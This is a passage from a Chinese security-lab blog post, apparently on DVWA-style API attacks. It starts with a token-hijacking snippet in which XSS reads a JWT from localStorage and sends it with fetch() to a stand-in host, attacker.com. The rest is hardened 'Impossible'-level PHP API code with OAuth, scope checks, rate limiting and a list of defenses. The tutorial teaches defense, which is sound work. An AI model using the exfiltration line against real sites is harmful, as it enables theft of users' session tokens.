<h4 id="方法3：Token劫持"><a href="#方法3：Token劫持" class="headerlink" title="方法3：Token劫持"></a>方法3：Token劫持</h4><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 如果Token存储在localStorage</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="variable language_">localStorage</span>.<span class="title function_">getItem</span>(<span class="string">&#x27;jwt_token&#x27;</span>));</span><br><span class="line"></span><br><span class="line"><span class="comment">// 通过XSS窃取Token</span></span><br><span class="line"><span class="title function_">fetch</span>(<span class="string">&#x27;http://attacker.com/steal?token=&#x27;</span> + <span class="variable language_">localStorage</span>.<span class="title function_">getItem</span>(<span class="string">&#x27;jwt_token&#x27;</span>));</span><br></pre></td></tr></table></figure>

<hr>
<h2 id="Impossible-难度"><a href="#Impossible-难度" class="headerlink" title="Impossible 难度"></a>Impossible 难度</h2><h3 id="攻击目标-3"><a href="#攻击目标-3" class="headerlink" title="攻击目标"></a>攻击目标</h3><p>完善的API安全，真正安全。</p>
<h3 id="后端代码分析-3"><a href="#后端代码分析-3" class="headerlink" title="后端代码分析"></a>后端代码分析</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">header</span>(<span class="string">&#x27;Content-Type: application/json&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// ★★★ Impossible: 完善的API安全 ★★★</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// ★★★ 核心防护1：OAuth 2.0认证 ★★★</span></span><br><span class="line"><span class="comment">// 使用标准的OAuth 2.0协议</span></span><br><span class="line"><span class="comment">// 从Authorization头获取Access Token</span></span><br><span class="line"><span class="variable">$authHeader</span> = <span class="variable">$_SERVER</span>[<span class="string">&#x27;HTTP_AUTHORIZATION&#x27;</span>] ?? <span class="string">&#x27;&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/Bearer\s+(.*)$/i&#x27;</span>, <span class="variable">$authHeader</span>, <span class="variable">$matches</span>)) &#123;</span><br><span class="line">    <span class="title function_ invoke__">http_response_code</span>(<span class="number">401</span>);</span><br><span class="line">    <span class="keyword">echo</span> <span class="title function_ invoke__">json_encode</span>([</span><br><span class="line">        <span class="string">&#x27;success&#x27;</span> =&gt; <span class="literal">false</span>,</span><br><span class="line">        <span class="string">&#x27;error&#x27;</span> =&gt; <span class="string">&#x27;Missing or invalid authorization header&#x27;</span></span><br><span class="line">    ]);</span><br><span class="line">    <span class="keyword">exit</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$accessToken</span> = <span class="variable">$matches</span>[<span class="number">1</span>];</span><br><span class="line"></span><br><span class="line"><span class="comment">// ★★★ 验证Access Token ★★★</span></span><br><span class="line"><span class="comment">// 通过OAuth 2.0服务器验证Token</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">verify_access_token</span>(<span class="params"><span class="variable">$token</span></span>) </span>&#123;</span><br><span class="line">    <span class="comment">// 调用OAuth 2.0服务器的introspection endpoint</span></span><br><span class="line">    <span class="variable">$oauth_server</span> = <span class="string">&#x27;https://oauth.example.com/introspect&#x27;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="variable">$response</span> = <span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$oauth_server</span>, <span class="literal">false</span>, <span class="title function_ invoke__">stream_context_create</span>([</span><br><span class="line">        <span class="string">&#x27;http&#x27;</span> =&gt; [</span><br><span class="line">            <span class="string">&#x27;method&#x27;</span> =&gt; <span class="string">&#x27;POST&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;header&#x27;</span> =&gt; <span class="string">&#x27;Content-Type: application/x-www-form-urlencoded&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;content&#x27;</span> =&gt; <span class="title function_ invoke__">http_build_query</span>([<span class="string">&#x27;token&#x27;</span> =&gt; <span class="variable">$token</span>])</span><br><span class="line">        ]</span><br><span class="line">    ]));</span><br><span class="line"></span><br><span class="line">    <span class="variable">$data</span> = <span class="title function_ invoke__">json_decode</span>(<span class="variable">$response</span>, <span class="literal">true</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 检查Token是否有效</span></span><br><span class="line">    <span class="keyword">if</span> (!<span class="variable">$data</span>[<span class="string">&#x27;active&#x27;</span>]) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$data</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$tokenData</span> = <span class="title function_ invoke__">verify_access_token</span>(<span class="variable">$accessToken</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!<span class="variable">$tokenData</span>) &#123;</span><br><span class="line">    <span class="title function_ invoke__">http_response_code</span>(<span class="number">401</span>);</span><br><span class="line">    <span class="keyword">echo</span> <span class="title function_ invoke__">json_encode</span>([</span><br><span class="line">        <span class="string">&#x27;success&#x27;</span> =&gt; <span class="literal">false</span>,</span><br><span class="line">        <span class="string">&#x27;error&#x27;</span> =&gt; <span class="string">&#x27;Invalid or expired access token&#x27;</span></span><br><span class="line">    ]);</span><br><span class="line">    <span class="keyword">exit</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$currentUserId</span> = <span class="variable">$tokenData</span>[<span class="string">&#x27;user_id&#x27;</span>];</span><br><span class="line"><span class="variable">$currentUserRole</span> = <span class="variable">$tokenData</span>[<span class="string">&#x27;role&#x27;</span>];</span><br><span class="line"><span class="variable">$scopes</span> = <span class="variable">$tokenData</span>[<span class="string">&#x27;scope&#x27;</span>] ?? [];</span><br><span class="line"></span><br><span class="line"><span class="comment">// ★★★ 核心防护2：基于Scope的权限 ★★★</span></span><br><span class="line"><span class="comment">// 检查Token是否有所需的权限范围</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">has_scope</span>(<span class="params"><span class="variable">$required_scope</span>, <span class="variable">$token_scopes</span></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="title function_ invoke__">in_array</span>(<span class="variable">$required_scope</span>, <span class="variable">$token_scopes</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// ★★★ 核心防护3：严格的限流 ★★★</span></span><br><span class="line"><span class="comment">// 使用Redis实现分布式限流</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">check_rate_limit_redis</span>(<span class="params"><span class="variable">$user_id</span></span>) </span>&#123;</span><br><span class="line">    <span class="variable">$redis</span> = <span class="keyword">new</span> <span class="title class_">Redis</span>();</span><br><span class="line">    <span class="variable">$redis</span>-&gt;<span class="title function_ invoke__">connect</span>(<span class="string">&#x27;127.0.0.1&#x27;</span>, <span class="number">6379</span>);</span><br><span class="line"></span><br><span class="line">    <span class="variable">$key</span> = <span class="string">&quot;api_rate_limit:user:<span class="subst">$user_id</span>&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 滑动窗口限流</span></span><br><span class="line">    <span class="variable">$current</span> = <span class="title function_ invoke__">time</span>();</span><br><span class="line">    <span class="variable">$window</span> = <span class="number">60</span>; <span class="comment">// 60秒窗口</span></span><br><span class="line">    <span class="variable">$limit</span> = <span class="number">100</span>; <span class="comment">// 最多100次请求</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 移除窗口外的请求</span></span><br><span class="line">    <span class="variable">$redis</span>-&gt;<span class="title function_ invoke__">zRemRangeByScore</span>(<span class="variable">$key</span>, <span class="number">0</span>, <span class="variable">$current</span> - <span class="variable">$window</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 获取当前窗口内的请求数</span></span><br><span class="line">    <span class="variable">$count</span> = <span class="variable">$redis</span>-&gt;<span class="title function_ invoke__">zCard</span>(<span class="variable">$key</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$count</span> &gt;= <span class="variable">$limit</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 记录当前请求</span></span><br><span class="line">    <span class="variable">$redis</span>-&gt;<span class="title function_ invoke__">zAdd</span>(<span class="variable">$key</span>, <span class="variable">$current</span>, <span class="title function_ invoke__">uniqid</span>());</span><br><span class="line">    <span class="variable">$redis</span>-&gt;<span class="title function_ invoke__">expire</span>(<span class="variable">$key</span>, <span class="variable">$window</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!<span class="title function_ invoke__">check_rate_limit_redis</span>(<span class="variable">$currentUserId</span>)) &#123;</span><br><span class="line">    <span class="title function_ invoke__">http_response_code</span>(<span class="number">429</span>);</span><br><span class="line">    <span class="keyword">echo</span> <span class="title function_ invoke__">json_encode</span>([</span><br><span class="line">        <span class="string">&#x27;success&#x27;</span> =&gt; <span class="literal">false</span>,</span><br><span class="line">        <span class="string">&#x27;error&#x27;</span> =&gt; <span class="string">&#x27;Rate limit exceeded&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;retry_after&#x27;</span> =&gt; <span class="number">60</span></span><br><span class="line">    ]);</span><br><span class="line">    <span class="keyword">exit</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$method</span> = <span class="variable">$_SERVER</span>[<span class="string">&#x27;REQUEST_METHOD&#x27;</span>];</span><br><span class="line"><span class="variable">$path</span> = <span class="variable">$_SERVER</span>[<span class="string">&#x27;PATH_INFO&#x27;</span>] ?? <span class="string">&#x27;&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// GET /api/users/&#123;id&#125;</span></span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$method</span> == <span class="string">&#x27;GET&#x27;</span> &amp;&amp; <span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/^\/users\/(\d+)$/&#x27;</span>, <span class="variable">$path</span>, <span class="variable">$matches</span>)) &#123;</span><br><span class="line"></span><br><span class="line">    <span class="variable">$userId</span> = <span class="variable">$matches</span>[<span class="number">1</span>];</span><br><span class="line"></span><br><span class="line">    <span class="comment">// ★★★ 核心防护4：Scope检查 ★★★</span></span><br><span class="line">    <span class="keyword">if</span> (!<span class="title function_ invoke__">has_scope</span>(<span class="string">&#x27;users:read&#x27;</span>, <span class="variable">$scopes</span>)) &#123;</span><br><span class="line">        <span class="title function_ invoke__">http_response_code</span>(<span class="number">403</span>);</span><br><span class="line">        <span class="keyword">echo</span> <span class="title function_ invoke__">json_encode</span>([</span><br><span class="line">            <span class="string">&#x27;success&#x27;</span> =&gt; <span class="literal">false</span>,</span><br><span class="line">            <span class="string">&#x27;error&#x27;</span> =&gt; <span class="string">&#x27;Insufficient permissions: users:read scope required&#x27;</span></span><br><span class="line">        ]);</span><br><span class="line">        <span class="keyword">exit</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// ★★★ 核心防护5：严格的授权检查 ★★★</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$currentUserRole</span> !== <span class="string">&#x27;admin&#x27;</span> &amp;&amp; <span class="variable">$currentUserId</span> != <span class="variable">$userId</span>) &#123;</span><br><span class="line">        <span class="title function_ invoke__">http_response_code</span>(<span class="number">403</span>);</span><br><span class="line">        <span class="keyword">echo</span> <span class="title function_ invoke__">json_encode</span>([</span><br><span class="line">            <span class="string">&#x27;success&#x27;</span> =&gt; <span class="literal">false</span>,</span><br><span class="line">            <span class="string">&#x27;error&#x27;</span> =&gt; <span class="string">&#x27;Forbidden: You can only view your own data&#x27;</span></span><br><span class="line">        ]);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// ★★★ 记录未授权访问尝试 ★★★</span></span><br><span class="line">        <span class="title function_ invoke__">logSecurityEvent</span>(<span class="string">&#x27;Unauthorized API access&#x27;</span>, [</span><br><span class="line">            <span class="string">&#x27;user_id&#x27;</span> =&gt; <span class="variable">$currentUserId</span>,</span><br><span class="line">            <span class="string">&#x27;target_user_id&#x27;</span> =&gt; <span class="variable">$userId</span>,</span><br><span class="line">            <span class="string">&#x27;endpoint&#x27;</span> =&gt; <span class="variable">$path</span>,</span><br><span class="line">            <span class="string">&#x27;method&#x27;</span> =&gt; <span class="variable">$method</span>,</span><br><span class="line">            <span class="string">&#x27;ip&#x27;</span> =&gt; <span class="variable">$_SERVER</span>[<span class="string">&#x27;REMOTE_ADDR&#x27;</span>]</span><br><span class="line">        ]);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">exit</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 查询用户（只返回必要字段）</span></span><br><span class="line">    <span class="variable">$stmt</span> = <span class="variable">$db</span>-&gt;<span class="title function_ invoke__">prepare</span>(<span class="string">&#x27;SELECT user_id, user, first_name, last_name, email FROM users WHERE user_id = :id&#x27;</span>);</span><br><span class="line">    <span class="variable">$stmt</span>-&gt;<span class="title function_ invoke__">bindParam</span>(<span class="string">&#x27;:id&#x27;</span>, <span class="variable">$userId</span>, PDO::<span class="variable constant_">PARAM_INT</span>);</span><br><span class="line">    <span class="variable">$stmt</span>-&gt;<span class="title function_ invoke__">execute</span>();</span><br><span class="line"></span><br><span class="line">    <span class="variable">$user</span> = <span class="variable">$stmt</span>-&gt;<span class="title function_ invoke__">fetch</span>(PDO::<span class="variable constant_">FETCH_ASSOC</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$user</span>) &#123;</span><br><span class="line">        <span class="comment">// ★★★ 记录API访问 ★★★</span></span><br><span class="line">        <span class="title function_ invoke__">logAPIAccess</span>(<span class="variable">$currentUserId</span>, <span class="string">&#x27;GET&#x27;</span>, <span class="variable">$path</span>, <span class="number">200</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">echo</span> <span class="title function_ invoke__">json_encode</span>([</span><br><span class="line">            <span class="string">&#x27;success&#x27;</span> =&gt; <span class="literal">true</span>,</span><br><span class="line">            <span class="string">&#x27;data&#x27;</span> =&gt; <span class="variable">$user</span></span><br><span class="line">        ]);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="title function_ invoke__">http_response_code</span>(<span class="number">404</span>);</span><br><span class="line">        <span class="keyword">echo</span> <span class="title function_ invoke__">json_encode</span>([</span><br><span class="line">            <span class="string">&#x27;success&#x27;</span> =&gt; <span class="literal">false</span>,</span><br><span class="line">            <span class="string">&#x27;error&#x27;</span> =&gt; <span class="string">&#x27;User not found&#x27;</span></span><br><span class="line">        ]);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// PUT /api/users/&#123;id&#125;</span></span><br><span class="line">&#125; <span class="keyword">elseif</span> (<span class="variable">$method</span> == <span class="string">&#x27;PUT&#x27;</span> &amp;&amp; <span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/^\/users\/(\d+)$/&#x27;</span>, <span class="variable">$path</span>, <span class="variable">$matches</span>)) &#123;</span><br><span class="line"></span><br><span class="line">    <span class="variable">$userId</span> = <span class="variable">$matches</span>[<span class="number">1</span>];</span><br><span class="line">    <span class="variable">$input</span> = <span class="title function_ invoke__">json_decode</span>(<span class="title function_ invoke__">file_get_contents</span>(<span class="string">&#x27;php://input&#x27;</span>), <span class="literal">true</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// ★★★ Scope检查 ★★★</span></span><br><span class="line">    <span class="keyword">if</span> (!<span class="title function_ invoke__">has_scope</span>(<span class="string">&#x27;users:write&#x27;</span>, <span class="variable">$scopes</span>)) &#123;</span><br><span class="line">        <span class="title function_ invoke__">http_response_code</span>(<span class="number">403</span>);</span><br><span class="line">        <span class="keyword">echo</span> <span class="title function_ invoke__">json_encode</span>([</span><br><span class="line">            <span class="string">&#x27;success&#x27;</span> =&gt; <span class="literal">false</span>,</span><br><span class="line">            <span class="string">&#x27;error&#x27;</span> =&gt; <span class="string">&#x27;Insufficient permissions: users:write scope required&#x27;</span></span><br><span class="line">        ]);</span><br><span class="line">        <span class="keyword">exit</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// ★★★ 授权检查 ★★★</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$currentUserRole</span> !== <span class="string">&#x27;admin&#x27;</span> &amp;&amp; <span class="variable">$currentUserId</span> != <span class="variable">$userId</span>) &#123;</span><br><span class="line">        <span class="title function_ invoke__">http_response_code</span>(<span class="number">403</span>);</span><br><span class="line">        <span class="keyword">echo</span> <span class="title function_ invoke__">json_encode</span>([</span><br><span class="line">            <span class="string">&#x27;success&#x27;</span> =&gt; <span class="literal">false</span>,</span><br><span class="line">            <span class="string">&#x27;error&#x27;</span> =&gt; <span class="string">&#x27;Forbidden: You can only update your own data&#x27;</span></span><br><span class="line">        ]);</span><br><span class="line">        <span class="keyword">exit</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// ★★★ 输入验证 ★★★</span></span><br><span class="line">    <span class="variable">$allowedFields</span> = [<span class="string">&#x27;first_name&#x27;</span>, <span class="string">&#x27;last_name&#x27;</span>, <span class="string">&#x27;email&#x27;</span>];</span><br><span class="line"></span><br><span class="line">    <span class="comment">// ★★★ 管理员也不能修改role（需要特殊权限） ★★★</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$currentUserRole</span> === <span class="string">&#x27;admin&#x27;</span> &amp;&amp; <span class="title function_ invoke__">has_scope</span>(<span class="string">&#x27;users:admin&#x27;</span>, <span class="variable">$scopes</span>)) &#123;</span><br><span class="line">        <span class="variable">$allowedFields</span>[] = <span class="string">&#x27;role&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="variable">$updates</span> = [];</span><br><span class="line">    <span class="variable">$params</span> = [<span class="string">&#x27;:id&#x27;</span> =&gt; <span class="variable">$userId</span>];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">foreach</span> (<span class="variable">$input</span> <span class="keyword">as</span> <span class="variable">$key</span> =&gt; <span class="variable">$value</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">in_array</span>(<span class="variable">$key</span>, <span class="variable">$allowedFields</span>)) &#123;</span><br><span class="line">            <span class="comment">// ★★★ 额外验证 ★★★</span></span><br><span class="line">            <span class="keyword">if</span> (<span class="variable">$key</span> === <span class="string">&#x27;email&#x27;</span> &amp;&amp; !<span class="title function_ invoke__">filter_var</span>(<span class="variable">$value</span>, FILTER_VALIDATE_EMAIL)) &#123;</span><br><span class="line">                <span class="title function_ invoke__">http_response_code</span>(<span class="number">400</span>);</span><br><span class="line">                <span class="keyword">echo</span> <span class="title function_ invoke__">json_encode</span>([</span><br><span class="line">                    <span class="string">&#x27;success&#x27;</span> =&gt; <span class="literal">false</span>,</span><br><span class="line">                    <span class="string">&#x27;error&#x27;</span> =&gt; <span class="string">&#x27;Invalid email format&#x27;</span></span><br><span class="line">                ]);</span><br><span class="line">                <span class="keyword">exit</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="variable">$updates</span>[] = <span class="string">&quot;<span class="subst">$key</span> = :<span class="subst">$key</span>&quot;</span>;</span><br><span class="line">            <span class="variable">$params</span>[<span class="string">&quot;:<span class="subst">$key</span>&quot;</span>] = <span class="variable">$value</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">empty</span>(<span class="variable">$updates</span>)) &#123;</span><br><span class="line">        <span class="title function_ invoke__">http_response_code</span>(<span class="number">400</span>);</span><br><span class="line">        <span class="keyword">echo</span> <span class="title function_ invoke__">json_encode</span>([</span><br><span class="line">            <span class="string">&#x27;success&#x27;</span> =&gt; <span class="literal">false</span>,</span><br><span class="line">            <span class="string">&#x27;error&#x27;</span> =&gt; <span class="string">&#x27;No valid fields to update&#x27;</span></span><br><span class="line">        ]);</span><br><span class="line">        <span class="keyword">exit</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="variable">$query</span> = <span class="string">&quot;UPDATE users SET &quot;</span> . <span class="title function_ invoke__">implode</span>(<span class="string">&#x27;, &#x27;</span>, <span class="variable">$updates</span>) . <span class="string">&quot; WHERE user_id = :id&quot;</span>;</span><br><span class="line">    <span class="variable">$stmt</span> = <span class="variable">$db</span>-&gt;<span class="title function_ invoke__">prepare</span>(<span class="variable">$query</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$stmt</span>-&gt;<span class="title function_ invoke__">execute</span>(<span class="variable">$params</span>)) &#123;</span><br><span class="line">        <span class="title function_ invoke__">logAPIAccess</span>(<span class="variable">$currentUserId</span>, <span class="string">&#x27;PUT&#x27;</span>, <span class="variable">$path</span>, <span class="number">200</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">echo</span> <span class="title function_ invoke__">json_encode</span>([</span><br><span class="line">            <span class="string">&#x27;success&#x27;</span> =&gt; <span class="literal">true</span>,</span><br><span class="line">            <span class="string">&#x27;message&#x27;</span> =&gt; <span class="string">&#x27;User updated&#x27;</span></span><br><span class="line">        ]);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="title function_ invoke__">http_response_code</span>(<span class="number">500</span>);</span><br><span class="line">        <span class="keyword">echo</span> <span class="title function_ invoke__">json_encode</span>([</span><br><span class="line">            <span class="string">&#x27;success&#x27;</span> =&gt; <span class="literal">false</span>,</span><br><span class="line">            <span class="string">&#x27;error&#x27;</span> =&gt; <span class="string">&#x27;Failed to update user&#x27;</span></span><br><span class="line">        ]);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="title function_ invoke__">http_response_code</span>(<span class="number">404</span>);</span><br><span class="line">    <span class="keyword">echo</span> <span class="title function_ invoke__">json_encode</span>([</span><br><span class="line">        <span class="string">&#x27;success&#x27;</span> =&gt; <span class="literal">false</span>,</span><br><span class="line">        <span class="string">&#x27;error&#x27;</span> =&gt; <span class="string">&#x27;Endpoint not found&#x27;</span></span><br><span class="line">    ]);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<h3 id="完善的防护机制"><a href="#完善的防护机制" class="headerlink" title="完善的防护机制"></a>完善的防护机制</h3><p><strong>多层防御：</strong></p>
<ol>
<li><strong>OAuth 2.0认证</strong> - 标准认证协议</li>
<li><strong>Scope权限</strong> - 细粒度权限控制</li>
<li><strong>分布式限流</strong> - Redis滑动窗口</li>
<li><strong>严格授权</strong> - 每个操作都检查</li>
<li><strong>输入验证</strong> - 验证所有输入</li>
<li><strong>审计日志</strong> - 记录所有操作</li>
<li><strong>错误不泄露</strong> - 统一错误信息</li>
<li><strong>PDO预编译</strong> - 防止SQL注入</li>
</ol>
<p><strong>安全流程：</strong></p>
